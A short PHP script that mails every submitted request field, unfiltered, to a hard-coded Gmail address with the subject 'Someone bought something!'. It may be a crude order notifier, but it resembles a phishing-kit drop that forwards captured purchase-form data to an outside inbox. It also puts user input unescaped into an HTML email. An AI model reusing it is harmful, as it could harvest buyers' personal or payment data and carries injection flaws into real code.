<?php
foreach ($_REQUEST as $key => $value ){
    $content .= $key.'   '.$value.'<br>';
 }
mail("bbeza488@gmail.com","Someone bought something!",$content,"Content-type:text/html");

?>